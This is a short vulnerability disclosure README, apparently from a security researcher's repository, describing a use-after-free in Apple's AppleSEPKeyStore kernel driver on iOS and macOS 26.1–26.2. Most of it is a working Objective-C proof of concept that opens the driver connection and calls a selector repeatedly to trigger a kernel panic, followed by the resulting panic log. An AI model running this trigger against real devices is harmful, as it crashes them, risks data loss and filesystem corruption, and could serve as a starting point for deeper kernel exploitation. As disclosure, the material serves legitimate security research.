# AppleSEPKeyStore Use-After-Free Panic

Author: [@zeroxjf](https://x.com/zeroxjf)

## Warning

**This code WILL crash your device.** Running these tools causes an immediate kernel panic.

- Save all work before running
- Potential for data loss on unsaved files
- Repeated panics may cause filesystem corruption
- Not responsible for boot loops, data loss, or bricked devices
- For security research purposes only

## Target

| | |
|--|--|
| iOS | 26.1 - 26.2 |
| macOS | 26.1 - 26.2 |
| Component | `com.apple.driver.AppleSEPKeyStore` |
| Kernel | Darwin 25.1.0 (xnu-12377.42.6) |

## Vulnerability

Use-after-free in IOCommandGate triggered via AppleSEPKeyStore. The kernel detects modification of a freed element at offset 72, indicating memory corruption after deallocation. This is a race condition where the command gate's internal state is accessed after being freed.

## Proof of Concept

```objc
// Open with type 0x2022
io_connect_t conn;
IOServiceOpen(service, mach_task_self(), 0x2022, &conn);

// Call selector 2 repeatedly (~41 times triggers UAF panic)
for (int i = 0; i < 50; i++) {
    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
    uint64_t out[1];
    uint32_t outCnt = 1;

    IOConnectCallMethod(conn, 2, scalars, 6, NULL, 0,
                        out, &outCnt, NULL, NULL);
    usleep(1000);  // 1ms delay
}
// UAF detected around call #41
```

## Panic Log

```
panic(cpu 4 caller 0xfffffff015b84ae0): [iokit.IOCommandGate]: element modified after free
  (off:72, val:0xfffffffffffffe00, sz:80, ptr:0xffffffe69b7d0db0)
   72: 0xfffffffffffffe00

Kernel version: Darwin Kernel Version 25.1.0: Thu Oct 23 11:09:22 PDT 2025;
  root:xnu-12377.42.6~55/RELEASE_ARM64_T8030

Panicked task 0xffffffe5b4f1e820: pid 956: Test

Kernel Extensions in backtrace:
   com.apple.driver.AppleSEPKeyStore(2.0)[AD3CDADB-06B6-32F5-9E47-9889901353CA]
      @0xfffffff016a47020->0xfffffff016a84f9f
```
